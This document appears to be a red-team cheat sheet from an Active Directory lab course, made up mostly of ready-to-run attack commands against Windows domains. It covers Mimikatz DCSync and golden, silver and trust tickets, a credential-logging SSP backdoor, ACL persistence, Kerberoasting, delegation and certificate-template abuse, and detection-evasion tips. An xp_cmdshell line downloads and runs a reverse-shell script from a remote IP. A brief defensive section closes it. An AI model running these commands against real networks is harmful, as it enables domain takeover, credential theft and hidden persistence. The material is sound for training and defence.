Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"

### Obfuscation
For Rubeus.exe, use ConfuserEx (https://github.com/mkaring/ConfuserEx) to obfuscate the binary.


# Execute mimikatz on DC as DA to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'–Computername dcorp-dc


# Golden ticket :
`Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"`z *Explanation : name of the module,Username for which the TGT is generated (use an active domain admin with high logon count),Domain FQDN,SID of the domain,NTLM (RC4) hash of the krbtgt account or Use /aes128 and
/aes256 for using AES keys which is MORE SILENT,Optional User RID (default 500) and Group default 513 512 520 518 519),Injects the ticket in current PowerShell process - no need to
save the ticket on disk(Stealthier due the time validation time taken to validite the TGT),Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future, Optional ticket lifetime (default is 10 years) in minutes.The default AD setting is 10 hours = 600 minutes,Optional ticket lifetime with renewal (default is 10 years)in minutes. The default AD setting is 7 days = 100800*

# Silver ticket (Similar command can be used for any other service on a machine.Which services? HOST, RPCSS, HTTP and many more):
`Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'` The only diff with the command above is this : /target:dcorp-dc.dollarcorp.moneycorp.local Target server FQDN, /service:cifs The SPN name of service for which TGS is to be created)

# Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server. Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages. All local logons on the DC are logged to
C:\Windows\system32\kiwissp.log
`$packages = Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
'Security Packages' -Value $packages`


# (Persisting through AD Group Templates)
## Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
## Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder( Go for what you exactly need and not the full permisions):
`Add-DomainObjectAcl -TargetIdentity'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`

`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`

## Using ActiveDirectory Module and RACE toolkit
(https://github.com/samratashok/RACE) :
`Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'-Verbose`

## Check (if what we did before worked or not) the Domain Admins permission - PowerView as normal user:
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
## Using ActiveDirectory Module:
(Get-Acl -Path 'AD:\CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$.IdentityReference -match 'student1'}

## Moreover now we can abuse :Abusing FullControl using PowerView:
`Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose`
## Using ActiveDirectory Module:
`Add-ADGroupMember -Identity 'Domain Admins' -Members testda`

## Abusing ResetPassword using PowerView:
`Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`
## Using ActiveDirectory Module:
`Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`

# Persisting though ACL security descriptors-securable objects for example remote access methods(really stealth way, as i think there is no way of detecting that)(One problem coulb be if u backdoor dc with a low pri acc, you have to have a way to priv esc)
 
## ACLs can be modified to allow non-admin users access to securable objects.(YOU HAVE TO BE DOMAIN ADMIN in a DC FOR EXAMPLE TO ADD REMOTE user ) Using the RACE toolkit:
`. C:\AD\Tools\RACE-master\RACE.ps1`
# On local machine for student1:
`Set-RemoteWMI -SamAccountName student1 -Verbose`
# On remote machine for student1 without explicit credentials:
`Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose`(you can ignore the whole "–namespace 'root\cimv2'" and will be applied to root namespace.)
# On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
`Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator–namespace 'root\cimv2' -Verbose`
# On remote machine remove permissions:
`Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose`

# On local machine for student1:
` Set-RemotePSRemoting -SamAccountName student1 -Verbose`
# On remote machine for student1 without credentials:
`Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose`
# On remote machine, remove the permissions:
`Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove`

# Using RACE or DAMP, with admin privs on remote machine (backdoor registry in order to dump hashes from a remote machine so after that create a silver ticket with rce to your target machine)
`Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose`
# As student1, retrieve machine account hash:
`Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose`
# Retrieve local account hash:
`Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose`
# Retrieve domain cached credentials:
`Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose`

# Kerberoasting: Find user accounts used as Service accounts there is no need that this service is actually running a service on a machine, if it has the SPN property populated it is a service acc(as a domain user you can request any tgs without having special priviledges)
## ActiveDirectory module
`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
## PowerView
`Get-DomainUser–SPN`

## Use Rubeus to list Kerberoast stats
`Rubeus.exe kerberoast /stats`
## Use Rubeus to request a TGS
`Rubeus.exe kerberoast /user:svcadmin /simple`
## To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of ATA - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
`Rubeus.exe kerberoast /stats /rc4opsec` (Reccomended onellll)
`Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec`
## Kerberoast all possible accounts
`Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt`

## Kerberoasting - AS-REPs  you might face that in cases of Oracle,products,workstations that are not windows,or some vpn staff) Enumerating accounts with Kerberos Preauth disabled (https://github.com/HarmJ0y/ASREPRoast)
## Using PowerView:
`Get-DomainUser -PreauthNotRequired -Verbose`
## Using ActiveDirectory module:
`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
## If our user has perimisions to Force disable Kerberos Preauth maybe on another user group we can do that : Let's enumerate the permissions for RDPUsers on ACLs using PowerView and disable pre-auth on Controlusers:
`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}` 
`Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose`
`Get-DomainUser -PreauthNotRequired -Verbose`

##  Request encrypted AS-REP for offline brute-force. Let's use ASREPRoast
`Get-ASREPHash -UserName VPN1user -Verbose`
## To enumerate all users with Kerberos preauth disabled and request a hash
`Invoke-ASREPRoast -Verbose`
## We can use John The Ripper to brute-force the hashes offline
`john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt`


## You can request TGS for every account SPN not set to null With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the forest and should be like " random/whoami1 " random would be the service name and whoami1 would be the FQDN of the target server) We can then request a TGS without special privileges. The TGS can then be "Kerberoasted"

## Let's enumerate the permissions for RDPUsers on ACLs using PowerView (dev):
`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
## Using Powerview (dev), see if the user already has a SPN:
`Get-DomainUser -Identity supportuser | select serviceprincipalname`
## Using ActiveDirectory module:
`Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`

## Set a SPN for the user (as said above)
`Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}`
## Using ActiveDirectory module:
`Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}`

## Kerberoast the user
`Rubeus.exe kerberoast /outfile:targetedhashes.txt`


# Kerberos Delegation
## UNCONSTRAINED DELEGATION

# The idea is Discover domain computers which have unconstrained delegation enabled using PowerView :
`Get-DomainComputer -UnConstrained`
## Using ActiveDirectory module:
`Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
`Get-ADUser -Filter {TrustedForDelegation -eq $True}`

## Compromise the server(s) where Unconstrained delegation is enabled and get admin privs. We must trick or wait for a domain admin to connect a service on appsrv. Now, if the command is run again:
`Invoke-Mimikatz–Command '"sekurlsa::tickets /export"'`
## The DA token could be reused:
`Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`

## PRINTER-BUG A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.

## We can capture the TGT of dcorp-dc$ by using Rubeus (https://github.com/GhostPack/Rubeus) on dcorp-appsrv:
`Rubeus.exe monitor /interval:5 /nowrap`
## And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on the student VM:
`MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local\\dcorp-appsrv.dollarcorp.moneycorp.local`

## We can also use PetitPotam.exe (https://github.com/topotam/PetitPotam) on dcorp-appsrv, PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC(so that can be done through a non-domain machine and the function runs even if the service is not enabled:
`PetitPotam.exe dcorp-appsrv dcorp-dc`
## On dcorp-appsrv:
`Rubeus.exe monitor /interval:5`
## Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
`Rubeus.exe ptt /tikcet:`
## Once the ticket is injected, run DCSync:
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

## CONSTRAINED DELEGATION 
## Constrained Delegation with Protocol Transition means The web service requests a ticket from the Key Distribution Center (KDC) for someones's account without supplying a password, as the websvc account. The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that someones's account is not blocked for delegation. To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.

## Enumerate users and computers with constrained delegation enabled ,Using PowerView (dev)
`Get-DomainUser–TrustedToAuth`
`Get-DomainComputer–TrustedToAuth`
## Using ActiveDirectory module:
`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`

##  Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv
## Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
`kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f`
## Using s4u from Kekeo, we request a TGS  
`tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyco rp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL`
## Using mimikatz, inject the ticket:
`Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO
CAL.kirbi"'`
`ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`

## To abuse Constrained delegation using Rubeus, we can use the following command (We are requesting a TGT and TGS in a single command):
`Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt`
`ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`

## (SUPER IMPORTANT !!) In Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. For example this account samaccountname: (DCORP-ADMINSRV$) can acces this service msds-allowedtodelegateto : (TIME/dcorp-cd.etc) as any user and it can also access all the services that run with the same service account as the TIME service. So all interesting services uses the machine account as the service account (for example TIME SERVICE,winrm, http,rpcss and etc). So that means what we cannot only access the TIME service on the domain controller as an  domain administrator but we can also access the other services.

## Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash  Using asktgt from Kekeo, we request a TGT:
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
## Using s4u from Kekeo_one (no SNAME validation):
`tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyc orp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL`

## Using mimikatz:
`Invoke-Mimikatz -Command '"kerberos::ptt GS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'`
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

## To abuse constrained delegation for dcorp-adminsrv$ using Rubeus, we can use the following command (We are requesting a TGT and TGS in a single command)(We asked LDAP service so as to perform dc-sync later :):
`Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt`
## After injection, we can run DCSync:
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`


##  Resource-based Constrained Delegation moves delegation authority to the resource/service administrator. Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service. That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins. o abuse RBCD in the most effective form, we just need two privileges.
– One, control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)
– Two, Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity

## Admin privileges on student VMs that are domain joined machines.Enumeration for the users with Write permissions over the machines that have RCBD!
https://gist.github.com/FatRodzianko/e4cf3efc68a700dca7cedbfd5c05c99f
## Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!
`Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}`

## Check the MachineAccountQuota setting for the domain and create a computer account using PowerMad:
#Check MachineAccountQuotaValue
`Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'`
#Use PowerMad to leverage MachineAccountQuota and make a new machine that we have control over
`Import-Module C:ToolsPowermad-masterPowermad.ps1`
`$password = ConvertTo-SecureString 'ThisIsAPassword' -AsPlainText -Force`
`New-MachineAccount -machineaccount dcorp-student1 -Password $($password)`


## Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for
student machines :
`$comps = 'dcorp-student1$','dcorp-student2$'`
`Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps`
## Now, let's get the privileges of dcorp-studentx$ by extracting its AESkeys:
`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
## Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-
mgmt as ANY user we want:
`Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt`
`winrs -r:dcorp-mgmt cmd.exe`(Because we have a TGS we cannot jump to another machine as a Domain Admin)

# (Child to Parent)(Forest priv esc)Knock knock whos there? Enterprise admin plz open the gates
## sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed,they get a new SID and the old SID is added to sIDHistory.sIDHistory can be abused in two ways of escalating privileges within a forest:
– krbtgt hash of the child
– Trust tickets
## So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent.
`Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc`
## We can forge and inter-realm TGT:
`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'`

kerberos::golden The mimikatz module
/domain:dollarcorp.moneycorp.local FQDN of the current domain
/sid:S-1-5-21-1874506631-3219952063-538504511 SID of the current domain
/sids:S-1-5-21-280534878-1496970234-700767426-519 SID of the enterprise admins group of the parent domain
/rc4:7ef5be456dc8d7450fb8f5f7348746c5 RC4 of the trust key
/user:Administrator User to impersonate
/service:krbtgt Target service in the parent domain
/target:moneycorp.local FQDN of the parent domain
/ticket:C:\AD\Tools\trust_tkt.kirbi Path where ticket is to be saved

## Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
`.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local`
## Use the TGS to access the targeted service.
`.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi`
`ls \\mcorp-dc.moneycorp.local\c$`
## Tickets for other services (like HOST and RPCSS for WMI, HTTP forPowerShell Remoting and WinRM) can be created as well
## We can use Rubeus too for same results! Note that we are still using the TGT forged initially
`Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt`
`ls \\mcorp-dc.moneycorp.local\c$`

## Child to Parent using krbtgt hash.We will abuse sIDhistory once again
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'`
## In the above command, the mimkatz option "/sids" is forcefully setting the sIDHistory for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group.

## On any machine of the current domain
`Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'`
`ls \\mcorp-dc.moneycorp.local.kirbi\c$`
`gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local`
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"`
## Child to Parent using krbtgt hash (Reccomended way, really silent and bypasses MDI)Avoid suspicious logs by using Domain Controllers group. • S-1-5-21-2578538781-2508153159-3419410681-516 – Domain Controllers • S-1-5-9 – Enterprise Domain Controllers
`Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'`
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'`

## Across forest trusts will not work as the above as there is SID filtering. You can only access resources that are explicitly allowed, between forests and you do it the same way as above. In this case the shares
`Once again, we require the trust key for the inter-forest trust.
Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
## An inter-forest TGT can be forged
`Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'`
##  Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
`.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbiCIFS/eurocorp-dc.eurocorp.local`
## Use the TGS to access the targeted service.
`.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi`
`ls \\eurocorp-dc.eurocorp.local\forestshare\`
## Using Rubeus (using the same TGT which we forged earlier):
`Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi/service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt`
`ls \\eurocorp-dc.eurocorp.local\forestshare\`


# AD CS Certificates
## Enumerate (and for other attacks) AD CS in the target forest:
`Certify.exe cas`
## Enumerate the templates.:
`Certify.exe find`
## Enumerate vulnerable templates(This only checks if domain users have enrolemnt rights on any template) The attack surface is huge so dont trust this:  
`Certify.exe find /vulnerable`

## The template "SmartCardEnrollment-Agent" allows Domain users to enroll and has "Certificate Request Agent" EKU.
`Certify.exe find /vulnerable`
## The template "SmartCardEnrollment-Users" has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication. Search for domain authentication EKU:
`Certify.exe find /json /outfile:C:\AD\Tools\file.json ((Get-Content C:\AD\Tools\file.json | ConvertFrom-Json).CertificateTemplates | ? {$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *`

## Escalation to DA, We can now request a certificate for Certificate Request Agent from "SmartCardEnrollment-Agent" template.
`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA/template:SmartCardEnrollment-Agent`
## Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the "SmartCardEnrollment-Users" template.
`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123`
## Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it:
`Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt`

## scalation to EA, Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of EA using the "SmartCardEnrollment-Users" template.
`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123`
## Request EA TGT and inject it:
`Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt`

## The CA in moneycorp has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This means that we can request a certificate for ANY user from a template that allow enrollment for normal/low-privileged users.
`Certify.exe find`
## The template "CA-Integration" grants enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx
`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator`
## Convert from cert.pem to pfx (esc6.pfx below) and use it to request a TGT for DA (orEA).
`Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt`

## The template "HTTPSCertificates" has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag.(So we can access put the subject we want, so we can acces cert on behalf of whoever we want)
`Certify.exe find /enrolleeSuppliesSubject`
## The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx
`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`
## Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA).
`Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt`	


# Trust Abuse - MSSQL Servers - Databases links have no forest boundaries and etc ( same as love (credits to Nikhil Mittal) 

## Discovery (SPN Scanning)
`Get-SQLInstanceDomain`(returns all, maybe not active)
## Check Accessibility
`Get-SQLConnectionTestThreaded`
`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`(returns the active ones)
## Gather Information
`Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`(returns the active ones)
## A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.
## Searching Database Links, Look for links to remote servers
`Get-SQLServerLink -Instance dcorp-mssql -Verbose`
## Crawl all the Database Links and find the way to success
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`
## Executing Commands on all machines in the chain in order to see if any of them will give us a result back so we will have cmnd exec. When u find one machine,Use the -QuertyTarget parameter to run Query on a specific instance.(Have in mind that if you have admin privs one a database, you can do several things there, instead of just getting a rev shell and run whoam /all (get caught) and find priv esc)
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"`
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql`
`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1'')"'`

# What we learned so far
## Reduce the number of Domain Admins in your environment.
## Do not allow or limit login of DAs to any other machine other than the Domain Controllers. If logins to some servers is necessary, do not allow other administrators to login to that machine.
## (Try to) Never run a service with a DA. Credential theft protections(Credential Guard,Protected users group) are not protecting against extracting credential from the registry, only from lsass.
• Set "Account is sensitive and cannot be delegated" for DAs.

## Protected Users Group
• Protected Users is a group introduced in Server 2012 R2 for "better protection
against credential theft" by not caching credentials in insecure ways. A user added
to this group has following major device protections:
– Cannot use CredSSP and WDigest - No more cleartext credentials caching.
– NTLM hash is not cached.
– Kerberos does not use DES or RC4 keys. No caching of clear text cred or long term keys. You can still kerberoast a member of a protected user group because RC4 is controlled by the client because when u request a TGS you can force downgrade to RC4 and the KDC will comply !
• If the domain functional level is Server 2012 R2, following DC protections are
available:
– No NTLM authentication.
– No DES or RC4 keys in Kerberos pre-auth.
– No delegation (constrained or unconstrained)
– No renewal of TGT beyond initial four hour lifetime - Hardcoded, unconfigurable "Maximum
Protected Users Group
• Needs all domain control to be at least Server 2008 or later (because
AES keys).
• Not recommended by MS to add DAs and EAs to this group without
testing "the potential impact" of lock out.
• No cached logon ie.e no offline sign-on.
• Having computer and service accounts in this group is useless as their
credentials will always be present on the host machine.
Privileged Administrative Workstations (PAWs)
• A hardened workstation for performing sensitive tasks like
administration of domain controllers, cloud infrastructure, sensitive
business functions etc.
• Can provides protection from phishing attacks, OS vulnerabilities,
credential replay attacks.
• Admin Jump servers to be accessed only from a PAW, multiple strategies
– Separate privilege and hardware for administrative and normal tasks.
– Having a VM on a PAW for user tasks.
LAPS (Local Administrator Password Solution)
• Centralized storage of passwords in AD with periodic randomizing where
read permissions are access controlled.
• Computer objects have two new attributes - ms-mcs-AdmPwd attribute
stores the clear text password and ms-mcs-AdmPwdExpirationTime
